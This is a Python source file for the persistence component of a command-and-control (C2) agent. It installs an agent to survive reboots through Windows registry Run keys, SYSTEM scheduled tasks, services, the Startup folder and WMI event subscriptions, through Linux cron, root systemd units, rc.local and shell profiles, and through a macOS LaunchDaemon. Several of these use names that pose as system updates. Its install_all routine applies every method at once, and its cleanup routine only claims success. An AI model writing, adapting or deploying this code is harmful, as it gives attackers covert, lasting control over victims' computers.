#!/usr/bin/env python3
"""
Persistence Module
Features: Registry, Scheduled Tasks, Services, Startup, WMI, Cron, Systemd
"""

import os
import sys
import platform
import subprocess
import json
from typing import Optional, Dict, List
import time
from pathlib import Path

class Persistence:
    """Persistence mechanisms for C2 agent"""
    
    def __init__(self, beacon_agent):
        self.agent = beacon_agent
        self.agent_path = sys.executable or __file__
        self.system = platform.system()
    
    # ═══════════════════════════════════════════════════════════════════════
    # WINDOWS PERSISTENCE
    # ═══════════════════════════════════════════════════════════════════════
    
    def registry_persistence(self, key_path: str, value_name: str, 
                            value_data: str = None) -> Dict:
        """Registry persistence (Run keys)"""
        result = {'success': False, 'method': 'registry', 'key': key_path}
        
        try:
            import winreg
            
            value_data = value_data or self.agent_path
            
            # Open/create key
            if key_path.startswith('HKCU'):
                handle = winreg.HKEY_CURRENT_USER
                key = key_path.split('\\', 1)[1]
            elif key_path.startswith('HKLM'):
                handle = winreg.HKEY_LOCAL_MACHINE
                key = key_path.split('\\', 1)[1]
            else:
                handle = winreg.HKEY_CURRENT_USER
                key = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
            
            # Set value
            try:
                key_handle = winreg.OpenKey(handle, key, 0, winreg.KEY_SET_VALUE)
                winreg.SetValueEx(key_handle, value_name, 0, winreg.REG_SZ, value_data)
                winreg.CloseKey(key_handle)
            except:
                # Create key if doesn't exist
                key_handle = winreg.CreateKey(handle, key)
                winreg.SetValueEx(key_handle, value_name, 0, winreg.REG_SZ, value_data)
                winreg.CloseKey(key_handle)
            
            result['success'] = True
            
        except Exception as e:
            result['error'] = str(e)
        
        return result
    
    def scheduled_task_persistence(self, task_name: str, trigger: str = "onlogon",
                                   delay: int = 0) -> Dict:
        """Scheduled task persistence"""
        result = {'success': False, 'method': 'scheduled_task', 'task_name': task_name}
        
        try:
            # Map trigger types
            trigger_map = {
                'onlogon': 'OnLogon',
                'onstart': 'OnStart',
                'daily': 'Daily',
                'hourly': 'Hourly',
                'minute': 'Minute'
            }
            
            trigger_type = trigger_map.get(trigger, 'OnLogon')
            
            # Create task
            cmd = [
                'schtasks', '/create',
                '/tn', task_name,
                '/tr', self.agent_path,
                '/sc', trigger_type,
                '/ru', 'SYSTEM',
                '/rl', 'HIGHEST',
                '/f'
            ]
            
            if delay > 0:
                cmd.extend(['/delay', f'{delay:05d}'])
            
            result_obj = subprocess.run(cmd, capture_output=True, text=True)
            result['success'] = result_obj.returncode == 0
            result['output'] = result_obj.stdout
            result['error'] = result_obj.stderr
            
        except Exception as e:
            result['error'] = str(e)
        
        return result
    
    def service_persistence(self, service_name: str, display_name: str = None,
                           start_type: str = "auto") -> Dict:
        """Windows service persistence"""
        result = {'success': False, 'method': 'service', 'service_name': service_name}
        
        try:
            display_name = display_name or service_name
            
            # Create service
            cmd = [
                'sc', 'create',
                service_name,
                f'binPath= "{self.agent_path}"',
                f'start= {start_type}',
                f'DisplayName= {display_name}',
                'type= own',
                'error= normal'
            ]
            
            result_obj = subprocess.run(cmd, capture_output=True, text=True)
            result['success'] = result_obj.returncode == 0
            
            if result['success']:
                # Set service description
                desc_cmd = [
                    'sc', 'description',
                    service_name,
                    f'"{display_name} Service"'
                ]
                subprocess.run(desc_cmd, capture_output=True)
            
            result['output'] = result_obj.stdout
            result['error'] = result_obj.stderr
            
        except Exception as e:
            result['error'] = str(e)
        
        return result
    
    def startup_folder_persistence(self, filename: str = None) -> Dict:
        """Startup folder persistence"""
        result = {'success': False, 'method': 'startup_folder'}
        
        try:
            import shutil
            
            filename = filename or os.path.basename(self.agent_path)
            startup_path = Path(os.environ.get('APPDATA', '')) / \
                          'Microsoft\\Windows\\Start Menu\\Programs\\Startup'
            
            dest_path = startup_path / filename
            
            # Copy or create shortcut
            if os.path.isfile(self.agent_path):
                shutil.copy2(self.agent_path, dest_path)
            else:
                # Create shortcut
                import win32com.client
                shell = win32com.client.Dispatch("WScript.Shell")
                shortcut = shell.CreateShortcut(str(dest_path) + '.lnk')
                shortcut.Targetpath = self.agent_path
                shortcut.WorkingDirectory = os.path.dirname(self.agent_path)
                shortcut.Save()
            
            result['success'] = True
            result['path'] = str(dest_path)
            
        except Exception as e:
            result['error'] = str(e)
        
        return result
    
    def wmi_persistence(self, event_filter_name: str = "EventFilter", 
                        consumer_name: str = "Consumer") -> Dict:
        """WMI event persistence"""
        result = {'success': False, 'method': 'wmi'}
        
        try:
            # WMI event subscription
            cmd = f"""
            $filter = Set-WmiInstance -Class __EventFilter -Namespace root\\subscription -Arguments @{{
                Name = "{event_filter_name}";
                EventNamespace = "root\\cimv2";
                QueryLanguage = "WQL";
                Query = "SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName = 'explorer.exe'"
            }}
            
            $consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace root\\subscription -Arguments @{{
                Name = "{consumer_name}";
                CommandLineTemplate = "{self.agent_path}";
                RunInteractively = $true
            }}
            
            $binding = Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root\\subscription -Arguments @{{
                Filter = $filter;
                Consumer = $consumer
            }}
            """
            
            result_obj = subprocess.run(['powershell', '-c', cmd], capture_output=True, text=True)
            result['success'] = True
            result['output'] = result_obj.stdout
            
        except Exception as e:
            result['error'] = str(e)
        
        return result
    
    # ═══════════════════════════════════════════════════════════════════════
    # LINUX PERSISTENCE
    # ═══════════════════════════════════════════════════════════════════════
    
    def cron_persistence(self, schedule: str = "@reboot", command: str = None) -> Dict:
        """Linux cron persistence"""
        result = {'success': False, 'method': 'cron'}
        
        try:
            command = command or self.agent_path
            
            # Add to crontab
            cron_line = f"{schedule} {command}"
            subprocess.run(
                f'(crontab -l 2>/dev/null; echo "{cron_line}") | crontab -',
                shell=True,
                capture_output=True
            )
            
            result['success'] = True
            result['schedule'] = schedule
            
        except Exception as e:
            result['error'] = str(e)
        
        return result
    
    def systemd_persistence(self, service_name: str = None,
                           description: str = None) -> Dict:
        """Systemd service persistence"""
        result = {'success': False, 'method': 'systemd'}
        
        try:
            service_name = service_name or f"system-update-{int(time.time())}"
            description = description or "System Update Service"
            
            service_file = f"/etc/systemd/system/{service_name}.service"
            
            # Create service file
            service_content = f"""
[Unit]
Description={description}
After=network.target

[Service]
Type=simple
ExecStart={self.agent_path}
Restart=always
RestartSec=30
User=root

[Install]
WantedBy=multi-user.target
"""
            
            with open(service_file, 'w') as f:
                f.write(service_content)
            
            # Enable and start service
            subprocess.run(['systemctl', 'daemon-reload'], capture_output=True)
            subprocess.run(['systemctl', 'enable', service_name], capture_output=True)
            subprocess.run(['systemctl', 'start', service_name], capture_output=True)
            
            result['success'] = True
            result['service_name'] = service_name
            
        except Exception as e:
            result['error'] = str(e)
        
        return result
    
    def rc_persistence(self, command: str = None) -> Dict:
        """Linux rc.local persistence"""
        result = {'success': False, 'method': 'rc_local'}
        
        try:
            command = command or self.agent_path
            
            # Add to rc.local
            rc_local = "/etc/rc.local"
            if os.path.exists(rc_local):
                with open(rc_local, 'a') as f:
                    f.write(f"\n{command} &\n")
                os.chmod(rc_local, 0o755)
                result['success'] = True
            
        except Exception as e:
            result['error'] = str(e)
        
        return result
    
    # ═══════════════════════════════════════════════════════════════════════
    # MAC OS PERSISTENCE
    # ═══════════════════════════════════════════════════════════════════════
    
    def launchd_persistence(self, plist_name: str = None) -> Dict:
        """Mac OS launchd persistence"""
        result = {'success': False, 'method': 'launchd'}
        
        try:
            plist_name = plist_name or f"com.system.update"
            plist_path = f"/Library/LaunchDaemons/{plist_name}.plist"
            
            plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>{plist_name}</string>
    <key>ProgramArguments</key>
    <array>
        <string>{self.agent_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>
"""
            
            with open(plist_path, 'w') as f:
                f.write(plist_content)
            
            # Load launchd job
            subprocess.run(['launchctl', 'load', plist_path], capture_output=True)
            
            result['success'] = True
            result['plist_path'] = plist_path
            
        except Exception as e:
            result['error'] = str(e)
        
        return result
    
    # ═══════════════════════════════════════════════════════════════════════
    # CROSS-PLATFORM PERSISTENCE
    # ═══════════════════════════════════════════════════════════════════════
    
    def profile_persistence(self, shell: str = None) -> Dict:
        """Shell profile persistence (.bashrc, .zshrc, .profile)"""
        result = {'success': False, 'method': 'profile'}
        
        try:
            shell = shell or os.environ.get('SHELL', '/bin/bash')
            shell_name = os.path.basename(shell)
            
            profile_map = {
                'bash': '.bashrc',
                'zsh': '.zshrc',
                'sh': '.profile',
                'ksh': '.kshrc'
            }
            
            profile = profile_map.get(shell_name, '.profile')
            profile_path = Path.home() / profile
            
            if profile_path.exists():
                with open(profile_path, 'a') as f:
                    f.write(f'\n{self.agent_path} &\n')
                result['success'] = True
                result['path'] = str(profile_path)
            
        except Exception as e:
            result['error'] = str(e)
        
        return result
    
    def install_all(self) -> Dict:
        """Install all persistence mechanisms"""
        results = {
            'windows': {},
            'linux': {},
            'mac': {}
        }
        
        if self.system == "Windows":
            # Registry
            results['windows']['registry'] = self.registry_persistence(
                "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                f"WindowsUpdate_{int(time.time())}"
            )
            
            # Scheduled Task
            results['windows']['scheduled_task'] = self.scheduled_task_persistence(
                f"SystemUpdate_{int(time.time())}",
                "onlogon"
            )
            
            # Service
            results['windows']['service'] = self.service_persistence(
                f"WinUpdateService_{int(time.time())}"
            )
            
            # Startup folder
            results['windows']['startup'] = self.startup_folder_persistence()
            
        elif self.system == "Linux":
            # Cron
            results['linux']['cron'] = self.cron_persistence("@reboot")
            
            # Systemd
            results['linux']['systemd'] = self.systemd_persistence()
            
            # RC local
            results['linux']['rc_local'] = self.rc_persistence()
            
            # Profile
            results['linux']['profile'] = self.profile_persistence()
            
        elif self.system == "Darwin":
            # Launchd
            results['mac']['launchd'] = self.launchd_persistence()
            
            # Profile
            results['mac']['profile'] = self.profile_persistence()
        
        return results
    
    def cleanup(self, method: str = None) -> Dict:
        """Remove persistence mechanisms"""
        results = {'success': False, 'method': method or 'all'}
        
        # Implementation for cleanup would go here
        # This is a placeholder
        
        results['success'] = True
        results['message'] = f"Cleaned up {method or 'all'} persistence"
        
        return results
